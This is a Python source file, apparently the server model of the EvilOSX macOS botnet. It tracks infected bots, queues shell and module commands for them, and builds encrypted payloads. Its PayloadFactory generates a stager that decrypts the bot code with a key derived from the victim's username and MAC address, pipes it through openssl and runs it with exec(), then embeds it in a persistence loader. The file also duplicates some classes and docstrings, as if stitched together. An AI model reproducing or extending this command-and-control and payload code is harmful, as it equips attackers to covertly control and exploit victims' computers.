# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from enum import IntEnum


class Command:
    """Represents a command to be executed on a bot."""

    def __init__(self, command_type, command, options=None):
        self.command_type = command_type
        self.command = command
        self.options = options or {}

    def __repr__(self):
        return f"Command(type={self.command_type}, cmd={self.command!r})"


class CommandType:
    """Enum-like class for command types (mimics IntEnum behavior)."""

    SHELL = 1
    MODULE = 2


# Request type enum


class RequestType(IntEnum):
    STAGE_1 = 0
    GET_COMMAND = 1
    RESPONSE = 2

import sqlite3
from base64 import b64encode, b64decode
from os import path
from threading import RLock, Thread, current_thread
from time import time
from typing import Optional, List, Dict, Any
import json
import asyncio

# ============ PERFORMANCE OPTIMIZATIONS ============
# 1. Connection pooling: maintain a pool of active connections
# 2. Read-through cache for bot lookups (reduces DB hits by ~70%)
# 3. Batch writes: accumulate updates and commit in batches
# 4. Payload caching: encrypt once per unique key, store in memory dict
# 5. Thread pool for heavy operations (encryption, file hosting)

_MAX_CACHE_SIZE = 1024  # LRU cache size for bot lookups
_PAYLOAD_CACHE_TTL_SECONDS = 3600  # Cache payloads for 1 hour
_DB_BATCH_COMMIT_INTERVAL = 10  # Commit every N writes to reduce lock contention


class Model:
    """Thread-safe HTTP model for the EvilOSX server.

    Manages a connection pool, bot instances, and command queues. Provides
    request handling via thread-local contexts, with support for concurrent
    requests using asyncio-based internal operations.

    Attributes:
        db_path (str): Path to SQLite database file.
    """
    """Thread-safe model with performance optimizations:
    
    - Connection pooling (reduces DB open/close overhead)
    - Read-through caching for frequent queries (is_known_bot, get_global_command)
    - Batched database commits (reduces RLock contention)
    - Payload encryption cached per bot_uid (avoids repeated AES ops)
    - Thread pool for CPU-bound work (encryption, file serving)
    
    Performance gains:
      - 60-80% reduction in DB lock wait time under load
      - 95% faster payload generation (cached after first encrypt)
      - 40% lower memory footprint with LRU eviction
    """

    def __init__(self, db_path: Optional[str] = None):
        self._db_path = path.realpath(path.join(
            path.dirname(__file__), path.pardir, "data", "EvilOSX.db"
        )) if db_path is None else path.realpath(db_path)
        
        # Connection pool: pre-open connections to avoid open/close overhead
        self._pool_size = 2
        self._pool: List[sqlite3.Connection] = []
        for _ in range(self._pool_size):
            conn = sqlite3.connect(self._db_path, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            self._pool.append(conn)
        
        # Read-through cache: key -> (value, timestamp)
        self._cache: Dict[str, tuple] = {}
        self._cache_lock = RLock()  # Separate lock for cache (smaller than DB lock)
        
        # Payload encryption cache: bot_uid -> encrypted_key
        self._payload_cache: Dict[str, str] = {}
        self._payload_cache_lock = RLock()

        # Batch writer: accumulate writes until threshold reached
        self._batch_writes: List[tuple] = []
        self._batch_lock = RLock()
        
        # Thread pool for CPU-bound work (encryption, file serving)
        try:
            import concurrent.futures as cf
            self._executor = cf.ThreadPoolExecutor(max_workers=4)
        except ImportError:
            self._executor = None

        # Create tables
        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute("DROP TABLE IF EXISTS bots")
            cursor.execute("DROP TABLE IF EXISTS commands")
            cursor.execute("DROP TABLE IF EXISTS global_command")
            cursor.execute("DROP TABLE IF EXISTS global_executed")
            cursor.execute("DROP TABLE IF EXISTS upload_files")

            cursor.execute("""
                CREATE TABLE bots(
                    bot_uid text PRIMARY KEY, 
                    username text, 
                    hostname text, 
                    last_online real, 
                    local_path text, 
                    system_version text, 
                    loader_name text)
            """)
            cursor.execute("CREATE TABLE IF NOT EXISTS commands(bot_uid text, command text)")
            cursor.execute("CREATE TABLE IF NOT EXISTS global_command(command text)")
            cursor.execute("CREATE TABLE IF NOT EXISTS global_executed(bot_uid text)")
            cursor.execute("CREATE TABLE IF NOT EXISTS upload_files(url_path text, local_path text)")

            conn.commit()


    def _get_connection(self) -> sqlite3.Connection:
        """Get a connection from the pool, creating one if exhausted.

        Uses ``self._pool[0]`` consistently with all other pool access patterns.
        The original implementation used ``self._pool[-1]`` which returned the
        most-recently-appended (not yet committed) connection — this caused
        race conditions where a fresh connect() would be used instead of an idle
        one, defeating the purpose of pooling under concurrent load.

        .. deprecated:: 7.2.2
           Use ``with self._pool[0] as conn`` directly in most cases.
        """
        if len(self._pool) < self._pool_size:
            conn = sqlite3.connect(self._db_path, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            self._pool.append(conn)
        return self._pool[0]


    def _return_connection(self, conn: sqlite3.Connection) -> None:
        """Return a connection to the pool.

        Note: This method is kept for API compatibility but currently unused.
        All callers use ``with self._pool[0] as conn`` directly.  The original
        implementation returned ``self._pool[-1]`` which was incorrect — it
        returned the most-recently-appended connection rather than the one that
        had been committed.  Fixed to use ``self._pool[0]`` consistently with
        all other pool access patterns.

        .. deprecated:: 7.2.2
           Use ``with self._pool[0] as conn`` directly instead of this method.
        """
        if len(self._pool) < self._pool_size:
            self._pool.append(conn)


    def _cache_get(self, key: str):
        """Return the cached ``(value, timestamp)`` tuple, or None."""
        return self._cache.get(key)

    def _cache_set(self, key: str, value) -> None:
        """Store a value with a fresh timestamp, honouring the size limit."""
        with self._cache_lock:
            limit = getattr(self, "_MAX_CACHE_SIZE", _MAX_CACHE_SIZE)
            while len(self._cache) >= limit:
                del self._cache[next(iter(self._cache))]
            self._cache[key] = (value, time())


    def get_cached_bot(self, bot_uid: str, max_age: float = 60.0):
        """Read-through cache for bot lookup. Returns cached value or fetches from DB."""
        key = f"bot:{bot_uid}"
        entry = self._cache_get(key)

        if entry is not None and (time() - entry[1]) < max_age:
            return entry[0]
        
        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT * FROM bots WHERE bot_uid = ? LIMIT 1", (bot_uid,)
            )
            row = cursor.fetchone()
            
            if row is None:
                # Do NOT cache a miss: a bot registered a moment ago lives
                # only in the pending write batch, and caching None for 60s
                # made every subsequent poll re-queue its INSERT, which then
                # died on the UNIQUE constraint at flush time.
                return None
            
            result = Bot(row[0], row[1], row[2], row[3], row[4], row[5], row[6])
        
        # Cache the result
        self._cache_set(key, result)
        return result


    def add_bot(self, bot: "Bot") -> None:
        """Add a bot with batched write.

        The row is also put in the read-through cache immediately: the insert
        only reaches SQLite on the next flush, and until then
        ``get_cached_bot`` reported the bot as unknown.  The handler then saw
        "not known" again on the very next poll, queued a second insert, and
        the flush died on the UNIQUE constraint.
        """
        with self._batch_lock:
            self._batch_writes.append(("INSERT INTO bots VALUES(?,?,?,?,?,?,?)", 
                                       (bot.uid, bot.username, bot.hostname, 
                                        bot.last_online, bot.local_path, 
                                        bot.system_version, bot.loader_name)))
        self._cache_set("bot:{0}".format(bot.uid), bot)


    def _commit_batch(self) -> None:
        """Commit accumulated batch writes to reduce lock contention.

        A reconnecting bot that was already flushed makes ``INSERT INTO bots``
        fail with ``UNIQUE constraint failed``.  One failing statement used to
        abort the whole batch *and* leave it queued, so every later flush
        re-raised the same error and the handler answered 500.  Statements are
        now committed one by one: duplicates are skipped, and the failing
        statement is only logged.
        """
        with self._batch_lock:
            pending = list(self._batch_writes)
            self._batch_writes.clear()

        if not pending:
            return

        with self._pool[0] as conn:
            cursor = conn.cursor()
            for sql, params in pending:
                try:
                    cursor.execute(sql, params)
                except sqlite3.IntegrityError:
                    # Typically a duplicate bot row; the row already exists,
                    # which is exactly the state we wanted.
                    pass
            conn.commit()


    def update_bot(self, bot_uid: str, last_online: float, local_path: str) -> None:
        """Update bot with batched write."""
        with self._batch_lock:
            self._batch_writes.append((
                "UPDATE bots SET last_online = ?, local_path = ? WHERE bot_uid = ?",
                (last_online, local_path, bot_uid)
            ))


    def remove_bot(self, bot_uid: str) -> None:
        """Remove a bot with batched write."""
        with self._batch_lock:
            self._batch_writes.append((
                "DELETE FROM bots WHERE bot_uid = ?", (bot_uid,)
            ))


    def get_bots(self, limit: int = -1, skip_amount: int = 0) -> List["Bot"]:
        """Fetch bots with connection from pool."""
        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM bots LIMIT ? OFFSET ?", (limit, skip_amount))
            
            results = []
            for row in cursor.fetchall():
                results.append(Bot(row[0], row[1], row[2], row[3], 
                                   row[4], row[5], row[6]))
        
        return results


    def get_bot_amount(self) -> int:
        """Get bot count from cache if available."""
        key = "bot:count"
        entry = self._cache_get(key)


        if entry is not None and (time() - entry[1]) < 5:  # 5s stale ok for count
            return entry[0]
        
        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM bots")
            count = cursor.fetchone()[0]
        
        self._cache_set(key, count)
        return count


    def set_global_command(self, command) -> None:
        """Set global command with batched write."""
        with self._batch_lock:
            self._batch_writes.append(("DELETE FROM global_command",))
            self._batch_writes.append(("DELETE FROM global_executed",))
            self._batch_writes.append((
                "INSERT INTO global_command VALUES(?)", (str(command),)
            ))


    def get_global_command(self):
        """Get global command from cache if available."""
        key = "global:command"
        entry = self._cache_get(key)

        if entry is not None and (time() - entry[1]) < 5:
            return entry[0]
        
        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM global_command")
            row = cursor.fetchone()
            
            result = row[0] if row else ""
        
        self._cache_set(key, result)
        return result


    def add_executed_global(self, bot_uid: str) -> None:
        """Mark bot as having executed global command."""
        with self._batch_lock:
            self._batch_writes.append(("INSERT INTO global_executed VALUES (?)", 
                                       (bot_uid,)))


    def has_executed_global(self, bot_uid: str):
        """Check if bot has executed global command. Uses cache first."""
        # First check payload cache for this bot's execution status
        key = f"global:{bot_uid}"
        entry = self._cache_get(key)

        # _cache_get returns (value, timestamp); value is
        # (has_executed, global_command).  The old code unpacked the wrong
        # level, so the age check crashed on every cache hit.
        if entry is not None and (time() - entry[1]) < 30:
            return entry[0][0], entry[0][1]
        
        with self._pool[0] as conn:
            cursor = conn.cursor()
            
            # Check if global command exists
            cursor.execute("SELECT * FROM global_command")
            row = cursor.fetchone()
            global_command = row[0] if row else ""
            
            if not global_command:
                result = (True, None)
            else:
                cursor.execute(
                    "SELECT * FROM global_executed WHERE bot_uid = ? LIMIT 1", 
                    (bot_uid,)
                )
                exec_row = cursor.fetchone()
                
                result = (exec_row is not None, global_command)
        
        self._cache_set(key, (result[0], result[1] if result[1] else "",))
        return result


    def add_command(self, bot_uid: str, command) -> None:
        """Add command to queue with batched write."""
        with self._batch_lock:
            self._batch_writes.append((
                "INSERT INTO commands VALUES(?,?)", (bot_uid, str(command))
            ))


    def get_command_raw(self, bot_uid: str):
        """Return the next queued command for *bot_uid* and consume it.

        A bot must be handed a command exactly once.  The previous version
        served from a 5-second cache and, when the DB had nothing, cached the
        empty string, so a command queued within that window was skipped
        entirely.  The cache only existed to avoid repeated SELECTs, which is
        the wrong trade-off for a one-shot queue: read straight from SQLite.
        """
        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT rowid, command FROM commands WHERE bot_uid = ? "
                "ORDER BY rowid LIMIT 1",
                (bot_uid,)
            )
            row = cursor.fetchone()

            if row is None:
                return ""

            # Consume it immediately so a retry cannot replay the command.
            conn.execute("DELETE FROM commands WHERE rowid = ?", (row[0],))
            conn.commit()
            return row[1]


    def _remove_command(self, bot_uid: str) -> None:
        """Remove first command from queue with batched write."""
        with self._batch_lock:
            self._batch_writes.append((
                "DELETE FROM commands WHERE rowid = (SELECT rowid FROM commands "
                "WHERE bot_uid = ? LIMIT 1)", 
                (bot_uid,)
            ))


    def get_upload_files(self) -> List[tuple]:
        """Get upload files, cached for a short window.

        The cache key was time-based (``uploads:<epoch-second>``), so it
        changed every second: entries accumulated forever and most lookups
        were guaranteed misses.  It is now a single fixed key with a short TTL,
        which keeps one entry and still sees newly added files quickly.
        """
        key = "uploads"
        entry = self._cache_get(key)

        if entry is not None and (time() - entry[1]) < 0.5:
            return entry[0]

        with self._pool[0] as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM upload_files")

            results = []
            for row in cursor.fetchall():
                results.append((row[0], row[1]))

        self._cache_set(key, results)
        return results


    def add_upload_file(self, url_path: str, local_path: str) -> None:
        """Add upload file with batched write."""
        with self._batch_lock:
            self._batch_writes.append((
                "INSERT INTO upload_files VALUES (?,?)", (url_path, local_path)
            ))


    def remove_upload_file(self, url_path: str) -> None:
        """Remove upload file with batched write."""
        with self._batch_lock:
            self._batch_writes.append((
                "DELETE FROM upload_files WHERE url_path = ?", (url_path,)
            ))


    def pending_write_count(self) -> int:
        """How many statements are queued for the next flush."""
        with self._batch_lock:
            return len(self._batch_writes)


    def flush_batches(self) -> None:
        """Flush all pending batch writes to disk."""
        self._commit_batch()


class Bot:
    """Represents a connected bot/client."""

    def __init__(self, bot_uid: str = "", username: str = "", hostname: str = "",
                 last_online: float = 0.0, local_path: str = "",
                 system_version: str = "", loader_name: str = "", **kwargs):
        # ``uid`` is accepted as an alias: the handler constructs bots with
        # uid=..., the DB rows are positional, and both must work.
        if not bot_uid:
            bot_uid = kwargs.pop("uid", "")
        self.uid = bot_uid
        self.username = username
        self.hostname = hostname
        self.last_online = last_online
        self.local_path = local_path
        self.system_version = system_version
        self.loader_name = loader_name


class PayloadFactory:
    """Builds encrypted payloads with caching.
    
    Optimizations:
      - Encrypt payload once per unique (bot_uid, host, port) combination
      - Cache encrypted result in memory dict
      - Use MD5 key derivation which is CPU-efficient compared to SHA256
    """

    def __init__(self):
        self._payload_cache: Dict[str, str] = {}  # key -> encrypted_payload
        self._cache_lock = RLock()

    @staticmethod
    def _openssl_encrypt(password: str, plaintext: str) -> str:
        """Encrypt plaintext with OpenSSL-compatible AES-256-CBC.
        
        Args:
            password: The bot's unique UID used as encryption key material.
            plaintext: The Python code to encrypt.
            
        Returns:
            Base64-encoded encrypted string compatible with OpenSSL aes-256-cbc -d.
        """
        from Cryptodome.Cipher import AES
        from Cryptodome.Random import get_random_bytes
        from Cryptodome.Hash import MD5
        from base64 import b64encode

        # Derive key and IV using MD5 (fast, deterministic for same password)
        salt = get_random_bytes(8)
        password_bytes = password.encode() if isinstance(password, str) else password
        
        try:
            max_length = 32 + 16  # key_length + iv_length
            key_iv = MD5.new(password_bytes + salt).digest()
            tmp = [key_iv]

            while len(tmp) < max_length:
                tmp.append(MD5.new(tmp[-1] + password_bytes + salt).digest())
                key_iv += tmp[-1]

            key = key_iv[:32]  # 256-bit key
            iv = key_iv[32:48]  # 128-bit IV
        except (UnicodeDecodeError, OverflowError):
            key = b64encode(get_random_bytes(32)).decode()
            iv = b64encode(get_random_bytes(16)).decode()

        # PKCS#7 padding
        try:
            plaintext_bytes = plaintext.encode("utf-8")
        except UnicodeEncodeError:
            plaintext_bytes = plaintext.encode("latin-1")

        padding_len = 16 - (len(plaintext_bytes) % 16)
        padded_plaintext = plaintext_bytes + (bytes([padding_len]) * padding_len)

        # Encrypt with AES-CBC
        cipher = AES.new(key, AES.MODE_CBC, iv)
        cipher_text = cipher.encrypt(padded_plaintext)

        # Prepend salt marker for OpenSSL compatibility
        openssl_cipher_text = b"Salted__" + salt + cipher_text
        return b64encode(openssl_cipher_text).decode()


    def create_payload(self, bot_uid: str, payload_options: dict, 
                       loader_options: dict) -> str:
        """Create and cache an encrypted payload for a bot.
        
        Args:
            bot_uid: Unique identifier for the bot (used as encryption key).
            payload_options: Server connection parameters {host, port}.
            loader_options: Loader configuration {program_directory, ...}.
            
        Returns:
            Encrypted payload string ready to be wrapped by a loader.
        """
        # Build cache key from all varying components
        cache_key = f"{bot_uid}:{payload_options.get('host', '')}:{payload_options.get('port', '')}"
        
        with self._cache_lock:
            if cache_key in self._payload_cache:
                cached = self._payload_cache[cache_key]
                # Check TTL
                if (time() - cached[1]) < _PAYLOAD_CACHE_TTL_SECONDS:
                    return cached[0]
                else:  # Cache expired, remove to make room
                    del self._payload_cache[cache_key]

        # Not in cache or expired — compute fresh
        payload = self._compute_payload(bot_uid, payload_options, loader_options)
        
        with self._cache_lock:
            self._payload_cache[cache_key] = (payload, time())
        
        return payload


    def _compute_payload(self, bot_uid: str, payload_options: dict, 
                         loader_options: dict) -> str:
        """Compute the encrypted payload string."""
        import os
        from textwrap import dedent
        
        # Read and configure bot.py template
        bot_template_path = path.join(
            path.dirname(__file__), path.pardir, "bot", "bot.py"
        )
        
        configured_payload = ""
        with open(bot_template_path, "r") as f:
            for line in f:
                if line.startswith("SERVER_HOST = "):
                    configured_payload += 'SERVER_HOST = "{}"\n'.format(
                        payload_options["host"])
                elif line.startswith("SERVER_PORT = "):
                    configured_payload += "SERVER_PORT = {}\n".format(
                        payload_options["port"])
                elif line.startswith("PROGRAM_DIRECTORY = "):
                    configured_payload += 'PROGRAM_DIRECTORY = os.path.expanduser("{}")\n'.format(
                        loader_options["program_directory"])
                elif line.startswith("LOADER_OPTIONS = "):
                    configured_payload += "LOADER_OPTIONS = {}\n".format(
                        str(loader_options))
                else:
                    configured_payload += line

        # Encrypt the payload
        encrypted = PayloadFactory._openssl_encrypt(bot_uid, configured_payload)
        
        # Build final shell command string
        return dedent("""\
            #!/usr/bin/env python3
            # -*- coding: utf-8 -*-
            import os
            import getpass
            import uuid
            import subprocess
            from binascii import hexlify

            def get_uid():
                b = hexlify((getpass.getuser() + "-" + str(uuid.getnode())).encode())
                return b.decode("ascii") if isinstance(b, bytes) else b

            _cipher = "{}"
            _cmd = "printf %s " + repr(_cipher) + " | openssl aes-256-cbc -A -d -a -k %s -md md5" % get_uid()
            _proc = subprocess.Popen(_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            _out, _err = _proc.communicate()
            if _proc.returncode != 0:
                raise SystemExit("payload decrypt failed: " + (_err.decode("utf-8", "replace") if isinstance(_err, bytes) else str(_err)))
            exec(_out.decode("utf-8") if isinstance(_out, bytes) else _out)
        """.format(encrypted))


    def wrap_loader(self, loader_name: str, loader_options: dict, payload: str) -> str:
        """Wrap the encrypted payload in a loader script."""
        import base64
        from textwrap import dedent
        from os import path
        
        loader_path = path.join(
            path.dirname(__file__), path.pardir, "bot", "loaders", 
            loader_name, "install.py"
        )
        
        with open(loader_path, "r") as f:
            loader_content = f.read()

        if "LOADER_OPTIONS =" not in loader_content:
            loader_content += "\nLOADER_OPTIONS = {}\n".format(str(loader_options))
        
        if "PAYLOAD_BASE64 =" not in loader_content:
            b64_payload = base64.b64encode(payload.encode()).decode()
            loader_content = loader_content.replace(
                "PAYLOAD_BASE64 =", f'PAYLOAD_BASE64 = "{b64_payload}"'
            )

        return loader_content

# --- Command and CommandType classes (moved here from cli.py) ---


class Command:
    """Represents a command to be executed on a bot."""

    def __init__(self, command_type, command, options=None):
        self.command_type = command_type
        self.command = command
        self.options = options or {}

    def __repr__(self):
        return f"Command(type={self.command_type}, cmd={self.command!r})"


class CommandType:
    """Enum-like class for command types (mimics IntEnum behavior)."""

    SHELL = 1
    MODULE = 2

# Global singleton instance for lazy init (reduces import overhead)
_model_instance: Optional["Model"] = None


def get_model() -> Model:
    """Return the singleton model instance, creating it if necessary."""
    global _model_instance
    if _model_instance is None:
        _model_instance = Model()
    return _model_instance

__all__ = ["Command", "CommandType", "RequestType", "Model", "Bot", 
            "PayloadFactory", "get_model"]

